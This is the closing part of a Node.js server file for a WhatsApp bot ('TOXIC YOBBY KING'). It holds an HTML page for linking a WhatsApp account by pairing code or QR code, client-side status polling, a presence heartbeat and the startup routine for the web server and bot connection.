    <button class="btn btn-secondary" onclick="startQRPairing()">SCAN QR CODE</button>
    <div class="pairing-code-container" id="pairingCodeContainer">
      <div class="pairing-code-label">🔗 Your Linking Code</div>
      <div class="pairing-code" id="pairingCode">----</div>
      <div class="instructions"><span>1.</span> WhatsApp > Settings > Linked Devices<br><span>2.</span> "Link with phone number"<br><span>3.</span> Enter the code above<br><span>4.</span> Session ID will appear on WhatsApp</div>
    </div>
    <div class="qr-container" id="qrContainer">
      <div class="pairing-code-label">📷 Scan QR Code</div>
      <img id="qrImage" src="" alt="QR" width="256" height="256">
    </div>
    <div class="status-box waiting" id="statusText"></div>
  </div>
  <div class="footer">☠️ TOXIC YOBBY KING v7.0 • <a href="https://github.com/king-techh/TOXIC_YOBBY_KING">FORK REPO</a> • © 2025 TOXIC TECH INC</div>
</div>
<script>
let currentSessionId=null;let pollInterval=null;
function setStatus(t,c){const e=document.getElementById('statusText');e.innerHTML=t;e.className='status-box '+(c||'waiting');}
async function connectWithSession(){const sid=document.getElementById('sessionIdInput').value.trim();if(!sid){setStatus('⚠️ Enter a session ID','error');return;}setStatus('<span class="spinner"></span>Checking session ID...');try{const r=await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:sid,phone:''})});const d=await r.json();if(d.error){setStatus('❌ '+d.error,'error');return;}currentSessionId=d.sessionId||sid;setStatus('<span class="spinner"></span>Connecting with session ID...');pollStatus();}catch(e){setStatus('❌ Error: '+e.message,'error');}}
async function startPairing(){const phone=document.getElementById('phoneInput').value.trim();if(!phone){setStatus('⚠️ Enter phone number','error');return;}const btn=document.getElementById('pairBtn');btn.disabled=true;btn.textContent='CONNECTING...';setStatus('<span class="spinner"></span>Requesting pairing code...');document.getElementById('pairingCodeContainer').style.display='none';document.getElementById('qrContainer').style.display='none';try{const r=await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone})});const d=await r.json();if(d.error){setStatus('❌ '+d.error,'error');btn.disabled=false;btn.textContent='GET PAIRING CODE';return;}currentSessionId=d.sessionId;pollStatus();}catch(e){setStatus('❌ Error: '+e.message,'error');btn.disabled=false;btn.textContent='GET PAIRING CODE';}}
async function startQRPairing(){setStatus('<span class="spinner"></span>Generating QR code...');document.getElementById('pairingCodeContainer').style.display='none';document.getElementById('qrContainer').style.display='none';try{const r=await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:''})});const d=await r.json();if(d.error){setStatus('❌ '+d.error,'error');return;}currentSessionId=d.sessionId;pollStatus(true);}catch(e){setStatus('❌ Error: '+e.message,'error');}}
function pollStatus(isQR=false){if(pollInterval)clearInterval(pollInterval);pollInterval=setInterval(async()=>{if(!currentSessionId)return;try{const r=await fetch('/api/status/'+currentSessionId);const d=await r.json();if(d.status==='pairing_code_ready'&&d.pairingCode){document.getElementById('pairingCode').textContent=d.pairingCode;document.getElementById('pairingCodeContainer').style.display='block';document.getElementById('qrContainer').style.display='none';setStatus('<span class="spinner"></span>Enter the code in WhatsApp...');const btn=document.getElementById('pairBtn');btn.disabled=false;btn.textContent='GET PAIRING CODE';}if(d.qrAvailable&&isQR){document.getElementById('qrImage').src='/api/qr/'+currentSessionId+'?t='+Date.now();document.getElementById('qrContainer').style.display='block';document.getElementById('pairingCodeContainer').style.display='none';setStatus('<span class="spinner"></span>Scan QR code with WhatsApp...');}if(d.connected){clearInterval(pollInterval);setStatus('✅ CONNECTED! Check WhatsApp for your Session ID. Bot is running!','connected');document.getElementById('botStatus').textContent='✅ CONNECTED - '+d.waNumber;document.getElementById('pairingCodeContainer').style.display='none';document.getElementById('qrContainer').style.display='none';}if(d.status==='pairing_failed'){clearInterval(pollInterval);setStatus('❌ Pairing failed: '+(d.error||'Unknown'),'error');document.getElementById('pairBtn').disabled=false;document.getElementById('pairBtn').textContent='GET PAIRING CODE';}if(d.status==='logged_out'){clearInterval(pollInterval);setStatus('❌ Session logged out. Try again.','error');}}catch(e){}},2000);}
</script>
</body>
</html>`);
});

// ──────────────────────────────────────────────
// Heartbeat
// ──────────────────────────────────────────────
setInterval(() => { if (waConnected && waSocket) try { waSocket.sendPresenceUpdate('available'); } catch (_) {} }, 30000);
process.on('uncaughtException', (err) => { console.error('[UNCAUGHT]', err.message); });
process.on('unhandledRejection', (err) => { console.error('[UNHANDLED]', err); });

// ──────────────────────────────────────────────
// Start
// ──────────────────────────────────────────────
(async () => {
  // Start web server
  app.listen(WEB_PORT, '0.0.0.0', () => {
    console.log(`[WEB] YOBBY TECH Deploy running on port ${WEB_PORT}`);
  });

  // Start WhatsApp bot
  try {
    await connectWhatsApp();
    console.log('[START] ' + BOT_NAME + ' v' + BOT_VERSION + ' initialized');
  } catch (err) {
    console.error('[START] Connection failed:', err.message);
    setTimeout(async () => { try { await connectWhatsApp(); } catch (_) {} }, 10000);
  }
})();
